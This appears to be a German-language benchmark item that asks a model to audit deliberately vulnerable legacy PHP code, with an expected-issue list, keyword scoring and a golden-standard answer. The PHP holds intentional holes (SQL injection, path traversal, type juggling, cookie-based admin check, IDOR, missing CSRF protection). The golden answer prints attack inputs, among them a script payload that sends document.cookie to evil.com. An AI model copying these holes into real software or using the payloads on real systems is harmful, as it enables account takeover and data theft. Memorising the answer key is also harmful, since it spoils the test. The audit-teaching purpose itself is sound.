# ============================================================
# Test-Kontext und Aufgabenstellung
# ============================================================

context: |
  Du bist ein Senior Security Engineer. Du führst ein Code-Audit für eine Legacy-PHP-Anwendung durch.
  Der Code enthält offensichtliche Fehler (teilweise von Junior-Devs kommentiert), aber auch subtile
  Sicherheitslücken, die nicht markiert sind.

prompt: |
  Analysiere den folgenden PHP-Code auf **Security-Vulnerabilities**.

  Der Code enthält drei Kategorien von Fehlern:
  1. **Markierte Issues**: Bereits identifizierte Probleme (bestätige diese).
  2. **Offensichtliche Issues**: Standard OWASP-Fehler ohne Markierung.
  3. **Subtile Issues**: Logikfehler oder sprachspezifische Schwachstellen (PHP).

  ## Deine Aufgabe
  Finde und erkläre **ALLE** Sicherheitslücken. Priorisiere sie nach Schweregrad (Critical/High/Medium).

  **PHP-Code:**

  ```php
  <?php
  // Legacy User System v1.0
  // Debugging enabled for dev (TODO: disable in prod)
  error_reporting(E_ALL);
  ini_set('display_errors', 1);

  $db = mysqli_connect("localhost", "root", "", "users_db");

  // === LOGIN HANDLER ===
  if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
      $username = $_POST['username'];
      $password = $_POST['password'];

      // ISSUE 1: SQL Injection Vulnerability
      $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
      $result = mysqli_query($db, $query);

      // ISSUE 2: Password stored in plain text
      if ($row = mysqli_fetch_assoc($result)) {
          // Login successful
          session_start();
          $_SESSION['user_id'] = $row['id'];
          $_SESSION['role'] = $row['role'];

          // Set "Remember Me" cookie
          setcookie('auth_user', $username, time() + 86400 * 30);

          echo "<h1>Welcome back, " . $username . "!</h1>";

          // Redirect to dashboard
          header("Location: /dashboard.php?uid=" . $row['id']);
      } else {
          echo "Invalid username or password";
      }
  }

  // === PASSWORD RESET ===
  if (isset($_POST['reset_request'])) {
      $email = $_POST['email'];
      // Generate reset token
      $token = md5(time() . rand());

      $sql = "UPDATE users SET reset_token='$token' WHERE email='$email'";
      mysqli_query($db, $sql);

      mail($email, "Password Reset", "Your token: $token");
  }

  // === API AUTHENTICATION ===
  function checkApiAccess($request_data) {
      $secret_key = "s8sk_api_2024";

      // Validate API Key
      if (isset($request_data['api_key'])) {
          // Loose comparison to allow flexible input types
          if ($request_data['api_key'] == $secret_key) {
              return true;
          }
      }
      return false;
  }

  // === FILE MANAGER ===
  if (isset($_GET['view_file'])) {
      $file = $_GET['view_file'];
      // Prevent accessing system files
      if (strpos($file, 'config.php') === false) {
          $path = 'user_files/' . $file;
          if (file_exists($path)) {
              readfile($path);
          }
      }
  }

  // === ADMIN ACTION ===
  if (isset($_POST['delete_user'])) {
      // Only admin can delete
      if ($_COOKIE['admin_flag'] == 1) {
          $uid = $_POST['uid'];
          mysqli_query($db, "DELETE FROM users WHERE id=$uid");
          echo "User deleted.";
      }
  }

  // === PROFILE UPDATE ===
  // Allow users to update their email
  if (isset($_POST['update_profile'])) {
      $new_email = $_POST['email'];
      $user_id = $_POST['user_id']; // Hidden field from form

      // Update email
      $stmt = mysqli_prepare($db, "UPDATE users SET email=? WHERE id=?");
      mysqli_stmt_bind_param($stmt, "si", $new_email, $user_id);
      mysqli_stmt_execute($stmt);

      echo "Profile updated!";
  }
  ?>

  ```

  ### Anforderungen an die Antwort:
  1. Identifiziere ALLE Vulnerabilities.
  2. Erstelle eine **Markdown-Tabelle** mit den folgenden Spalten:
     - **Vulnerability**: Name des Problems.
     - **Typ**: Categoria (Labeled, Standard, Advanced, Expert).
     - **Schweregrad**: (Critical, High, Medium, Low).
     - **Warum unsicher**: Kurze Erklärung.
     - **Fix**: Kurzer Code-Schnipsel oder Konzept.

  **WICHTIG**: Formatiere deine Antwort als korrekte Markdown-Tabelle (mit `|`). Fass dich in den Erklärungen in der Tabelle extrem kurz (max. 1-2 Sätze pro Zeile) und vermeide lange Einleitungen oder Ausschweifungen, um Token-Limits zu respektieren.
  Beispiel:
  | Vulnerability | Typ | Schweregrad | Warum unsicher | Fix |
  |---|---|---|---|---|
  | SQL Injection | Labeled | Critical | Direkte Einfügung | Prepared Statements |

# ============================================================
# Test-Daten (Issues zum Erkennen)
# ============================================================

test_data:
  issues:
    # --- LEVEL 1: Labeled (Easy) ---
    - issue: "SQL Injection (Login)"
      severity: "critical"
      type: "labeled"
      explanation: "Explizit markierte SQL Injection im Login."

    - issue: "Plaintext Passwords"
      severity: "critical"
      type: "labeled"
      explanation: "Explizit markierte fehlende Passwort-Hashes."

    # --- LEVEL 2: Unlabeled Standard (Medium) ---
    - issue: "XSS (Welcome Message)"
      severity: "high"
      type: "standard"
      explanation: "Unescaped echo output ($username)."

    - issue: "Session Fixation"
      severity: "high"
      type: "standard"
      explanation: "Kein session_regenerate_id() nach Login."

    - issue: "Insecure Cookie"
      severity: "medium"
      type: "standard"
      explanation: "Cookie ohne HttpOnly/Secure Flags."

    - issue: "Path Traversal"
      severity: "critical"
      type: "standard"
      explanation: "strpos check ist unzureichend, erlaubt ../../etc/passwd."

    # --- LEVEL 3: Hidden / Advanced (Hard) ---
    - issue: "Information Disclosure"
      severity: "medium"
      type: "advanced"
      explanation: "display_errors = 1 in Production Code."

    - issue: "Weak Randomness (Reset Token)"
      severity: "high"
      type: "advanced"
      explanation: "md5(time() . rand()) ist vorhersagbar."

    - issue: "Type Juggling (API Key)"
      severity: "high"
      type: "advanced"
      explanation: "Loose comparison (==) erlaubt Bypass wenn Input true/0 ist."

    - issue: "Insecure Admin Check (Cookie Manipulation)"
      severity: "critical"
      type: "advanced"
      explanation: "Verlässt sich auf Client-Side Cookie 'admin_flag'."

    # --- LEVEL 4: Expert (Very Hard) ---
    - issue: "IDOR (Profile Update)"
      severity: "critical"
      type: "expert"
      explanation: "Nutzer kann user_id im POST-Request manipulieren und fremde Profile ändern."

    - issue: "CSRF (Profile Update/Delete)"
      severity: "high"
      type: "expert"
      explanation: "Keine CSRF-Tokens in POST-Forms (Delete User, Profile Update)."

# ============================================================
# Scoring-Konfiguration
# ============================================================

scoring:
  total_points: 100

  error_detection:
    weight: 60
    description: "Erkennung der Vulnerabilities (Gestaffelt)"

    # 1. Labeled Issues (10 Punkte)
    labeled_issues:
      - issue: "SQL Injection (Login)"
        points: 5
        keywords: ["sql injection", "login query", "prepared statement", "sql-einschleusung", "datenbank query"]

      - issue: "Plaintext Passwords"
        points: 5
        keywords: ["password hash", "plaintext password", "passwort im klartext", "bcrypt", "unverschlüsseltes passwort"]

    # 2. Standard Issues (15 Punkte)
    standard_issues:
      - issue: "XSS (Welcome Message)"
        points: 4
        keywords: ["xss", "cross-site scripting", "htmlspecialchars", "output escaping", "skriptausführung"]

      - issue: "Session Fixation"
        points: 4
        keywords: ["session_regenerate_id", "session fixation", "session hijacking", "sitzungsübernahme"]

      - issue: "Path Traversal"
        points: 4
        keywords: ["path traversal", "directory traversal", "lfi", "local file inclusion", "pfadmanipulation", "unbefugter dateizugriff"]

      - issue: "Insecure Cookie"
        points: 3
        keywords: ["httponly flag", "secure flag", "insecure cookie", "cookie sicherheit"]

    # 3. Advanced Issues (15 Punkte)
    advanced_issues:
      - issue: "Weak Randomness (Token)"
        points: 4
        keywords: ["random_bytes", "random_int", "predictable randomness", "entropy", "kryptographisch sicher"]

      - issue: "Type Juggling (API Key)"
        points: 4
        keywords: ["type juggling", "loose comparison", "strict comparison", "typunsicherer vergleich"]

      - issue: "Insecure Admin Check"
        points: 4
        keywords: ["client-side trust", "cookie manipulation", "insecure authorization", "privilege escalation"]

      - issue: "Information Disclosure"
        points: 3
        keywords: ["display_errors", "error_reporting", "information leakage", "debug info"]

    # 4. Expert Issues (20 Punkte)
    expert_issues:
      - issue: "IDOR (Profile Update)"
        points: 10
        keywords: ["idor", "insecure direct object reference", "authorization check", "fremder zugriff"]

      - issue: "CSRF (Missing Tokens)"
        points: 10
        keywords: ["csrf", "cross-site request forgery", "csrf token", "anti-csrf"]

  solution_quality:
    weight: 30
    description: "Qualität der Fixes"

    criteria:
      - id: "SQ-001"
        name: "Prepared Statements (Code)"
        points: 10
        check_method: "code_validation"
        required_elements: ["prepare", "bind_param", "execute"]
        min_code_blocks: 1

      - id: "SQ-002"
        name: "CSRF Token Implementation"
        points: 10
        check_method: "keyword_presence"
        keywords: ["csrf_token", "session", "token", "input type=\"hidden\""]
        min_keywords: 2

      - id: "SQ-003"
        name: "Authorization Check (IDOR Fix)"
        points: 10
        check_method: "code_validation"
        required_elements: ["$_SESSION['user_id']"]
        min_code_blocks: 1

  formatting:
    weight: 10
    description: "Struktur"
    criteria:
      - id: "FM-001"
        name: "Strukturierte Liste"
        points: 10
        check_method: "markdown_table_validation"
        min_rows: 8

golden_standard: |
  # Security Audit Report – Legacy User System v1.0

  ## Zusammenfassung

  Der Code enthält **19 Sicherheitslücken** verteilt über alle drei Kategorien. Mehrere davon ermöglichen vollständige Systemkompromittierung ohne Authentifizierung.

  ---

  ## Vulnerability-Tabelle

  | Vulnerability | Typ | Schweregrad | Warum unsicher | Fix |
  |---|---|---|---|---|
  | **SQL Injection (Login)** | Labeled | Critical | `$username` und `$password` werden ungefiltert in den Query-String interpoliert. Angreifer kann mit `' OR '1'='1` die Authentifizierung vollständig umgehen oder die gesamte DB exfiltrieren. | `$stmt = mysqli_prepare($db, "SELECT * FROM users WHERE username=? AND password=?"); mysqli_stmt_bind_param($stmt, "ss", $username, $password);` |
  | **Plaintext-Passwörter** | Labeled | Critical | Passwörter werden ungehasht in der DB gespeichert und direkt im SQL-Vergleich genutzt. Ein DB-Dump oder SQL-Injection liefert sofort alle Credentials. | `password_hash($password, PASSWORD_BCRYPT)` beim Speichern, `password_verify()` beim Login |
  | **SQL Injection (Password Reset)** | Standard | Critical | `$email` wird ohne Sanitierung in den UPDATE-Query interpoliert. Angreifer kann beliebige Tokens setzen oder Daten manipulieren (z. B. `' OR '1'='1`). | Prepared Statement: `$stmt = mysqli_prepare($db, "UPDATE users SET reset_token=? WHERE email=?");` |
  | **SQL Injection (Delete User)** | Standard | Critical | `$uid` aus `$_POST` wird direkt in den DELETE-Query interpoliert: `DELETE FROM users WHERE id=$uid`. Ohne Quotes ist Integer-Injection möglich (z. B. `1 OR 1=1` → alle User gelöscht). | Prepared Statement mit Type-Cast: `$uid = (int)$_POST['uid'];` |
  | **Path Traversal (File Manager)** | Standard | Critical | Der Filter prüft nur auf den String `config.php`. Mit `../../../../etc/passwd` oder `../config.php.bak` wird der Filter trivial umgangen. `readfile()` liest dann beliebige Systemdateien. | Whitelist-Ansatz + `basename()`: `$file = basename($_GET['view_file']); $allowed = ['report.txt', 'log.csv'];` — zusätzlich `realpath()`-Validierung gegen das erlaubte Verzeichnis |
  | **Loose Comparison – Type Juggling (API Key)** | Expert | Critical | `==` statt `===` beim API-Key-Vergleich. PHP-Type-Juggling: Wenn der Angreifer via JSON `{"api_key": true}` sendet, ergibt `true == "s8sk_api_2024"` den Wert `true`, da jeder nicht-leere String in PHP truthy ist. Auch Magic-Hash-Kollisionen (`0e...`) sind möglich. Zusätzlich ist der Vergleich anfällig für Timing-Angriffe. | Strict Comparison + Timing-sicherer Vergleich + String-Cast: `if (hash_equals($secret_key, (string)$request_data['api_key']))` |
  | **Authentication via Cookie (Admin-Check)** | Standard | Critical | `$_COOKIE['admin_flag'] == 1` ist vollständig client-seitig kontrollierbar. Jeder Angreifer setzt `admin_flag=1` im Browser und kann beliebige User löschen. Zudem Loose Comparison (`==`). | Session-basierte Rollenprüfung: `if (isset($_SESSION['role']) && $_SESSION['role'] === 'admin')` |
  | **Insecure Direct Object Reference – IDOR (Profile Update)** | Standard | Critical | `$user_id` kommt aus einem Hidden-Field im POST-Body. Jeder authentifizierte User kann `user_id` auf eine fremde ID setzen und die E-Mail anderer Accounts überschreiben. Kritische Chain: IDOR → eigene Adresse als Admin-E-Mail setzen → Password-Reset anfordern → Token per Bruteforce (schwacher PRNG) → vollständiger Admin-Takeover. | Server-seitige ID erzwingen: `$user_id = $_SESSION['user_id'];` – niemals aus User-Input übernehmen |
  | **XSS (Reflected – Welcome-Message)** | Standard | High | `echo "<h1>Welcome back, " . $username . "!</h1>";` gibt den rohen POST-Wert aus. Angreifer injiziert `<script>document.location='https://evil.com/?c='+document.cookie</script>` als Username. | `echo "<h1>Welcome back, " . htmlspecialchars($username, ENT_QUOTES, 'UTF-8') . "!</h1>";` |
  | **Schwacher Reset-Token (MD5 + time + rand)** | Advanced | High | `md5(time() . rand())` ist deterministisch vorhersagbar: `time()` hat Sekundenauflösung, `rand()` ist kein CSPRNG. Angreifer mit bekanntem Zeitfenster kann den Token in Millisekunden bruteforcen. | `$token = bin2hex(random_bytes(32));` – kryptografisch sicherer CSPRNG, 256 Bit Entropie |
  | **Session Fixation** | Advanced | High | `session_start()` wird erst *nach* erfolgreichem Login aufgerufen. Damit wird die Session-ID nicht rotiert. Ein Angreifer kann eine bekannte Session-ID vorher fixieren und nach dem Login des Opfers übernehmen. | `session_start()` am Anfang des Scripts + `session_regenerate_id(true)` direkt nach erfolgreichem Login |
  | **Sensitive Data Exposure / Debug-Modus aktiv** | Standard | Medium | `error_reporting(E_ALL)` + `display_errors=1` in Produktion gibt Stack-Traces, DB-Fehlermeldungen und interne Pfade an den Client aus. Erleichtert Reconnaissance erheblich. | In Produktion: `display_errors=0`, `log_errors=1`, Fehler nur in serverseitige Log-Datei schreiben |
  | **Unsicheres Auth-Cookie (Remember Me)** | Advanced | Medium | `setcookie('auth_user', $username, ...)` setzt weder `HttpOnly` noch `Secure` noch `SameSite` Flag. Das Cookie enthält den Klarnamen (kein Token), ist per JavaScript auslesbar (XSS-Verstärker) und wird über HTTP übertragen. | `setcookie('auth_token', $token, ['expires'=>time()+86400*30, 'httponly'=>true, 'secure'=>true, 'samesite'=>'Strict']);` – Wert muss ein opaker Token sein, kein Username; Token-Hash in DB speichern |
  | **Header Injection nach Output (Login-Redirect)** | Expert | Medium | `echo "..."` wird vor `header("Location: ...")` ausgeführt. PHP sendet den Header ggf. nicht (Headers already sent). Außerdem enthält die Redirect-URL `$row['id']` ohne Validierung — und der Code läuft nach `header()` ohne `exit` weiter. | `header()` vor jeglichem Output aufrufen; danach `exit;` zwingend: `header("Location: /dashboard.php?uid=" . (int)$row['id']); exit;` |
  | **Hardcoded API Secret** | Standard | High | `$secret_key = 's8sk_api_2024'` steht im Klartext im Quellcode. Bei einem Source-Code-Leak (Git, Backup, oder via Path-Traversal-Exploit) ist der Key sofort kompromittiert und kann nicht ohne Code-Deployment rotiert werden. | Secret in Umgebungsvariable auslagern: `$secret_key = getenv('API_SECRET_KEY');` — niemals Secrets im Code oder Repository |
  | **Hardcoded DB-Credentials / Root ohne Passwort** | Standard | High | `mysqli_connect('localhost', 'root', '', 'userdb')` — Root-Zugang ohne Passwort verletzt das Least-Privilege-Prinzip. Root besitzt das FILE-Privilege (Dateisystem-Zugriff via SQL: `SELECT ... INTO OUTFILE`) und darf alle Datenbanken administrieren. | Dedizierter DB-User mit minimalen Rechten: `GRANT SELECT, INSERT, UPDATE, DELETE ON userdb.* TO 'appuser'@'localhost' IDENTIFIED BY '…'` — Credentials in `.env`-Datei außerhalb des Web-Roots |
  | **Fehlende CSRF-Protection** | Standard | High | Kein CSRF-Token bei POST-Requests (Password-Reset, Profil-Update, User-Delete). Angreifer kann via präparierter Drittseite Aktionen im Namen eingeloggter User erzwingen (E-Mail ändern, User löschen) – besonders gefährlich in Kombination mit Admin-Session. | Token in Session generieren: `$_SESSION['csrf'] = bin2hex(random_bytes(32))` — in Hidden-Field einbetten, serverseitig mit `hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')` validieren |
  | **Mail Header Injection** | Advanced | Medium | `$email` im `mail()`-Aufruf des Password-Reset wird nicht validiert. Angreifer injiziert Newlines (`\r\nBcc: victim@example.com`) und missbraucht die Anwendung als Spam-Relay oder für Phishing-Kampagnen. | `filter_var($email, FILTER_VALIDATE_EMAIL)` vor dem `mail()`-Aufruf; zusätzlich: `$email = str_replace([\"\r\n\", \"\n\"], \"\", $email);` |
  | **Reset Token ohne Ablaufzeit** | Standard | Medium | Der generierte Token wird ohne Timestamp gespeichert und nie invalidiert. Ein abgefangener oder kompromittierter Token bleibt dauerhaft gültig — kombiniert mit dem schwachen PRNG (#10) ein erhebliches Risiko. | Ablauf-Timestamp speichern: `WHERE reset_token=? AND reset_expires > NOW()` — Token nach Verwendung oder nach 1 Stunde invalidieren: `UPDATE users SET reset_token=NULL, reset_expires=NULL WHERE id=?` |

  ---

  ## Kritischer Angriffspfad (Proof-of-Concept-Kette)

  ```
  1. SQL Injection Login      →  Authentifizierung umgehen (kein Passwort nötig)
           ↓
  2. Cookie admin_flag=1      →  Admin-Rechte ohne Session
           ↓
  3. Delete uid=1 OR 1=1      →  Alle User gelöscht (SQL Injection in DELETE)
           ↓
  4. Path Traversal           →  ../../../../etc/passwd ausgelesen
           ↓
  5. CSRF (externe Seite)     →  Angreifer triggert Password-Reset für Admin
                                 ohne eigene Authentifizierung

  ALTERNATIVE CHAIN (authentifiziert):
  1. Login als normaler User
           ↓
  2. IDOR Profile Update      →  Admin-E-Mail auf eigene Adresse setzen
           ↓
  3. Password-Reset anfordern →  Token an Angreifer-Adresse
           ↓
  4. Token bruteforced        →  Vollständiger Admin-Takeover
  ```

  > **Fazit**: Der Code ist in seinem aktuellen Zustand **nicht produktionstauglich**. Mindestens 7 der 19 Schwachstellen erlauben vollständige Systemkompromittierung ohne vorherige Authentifizierung.
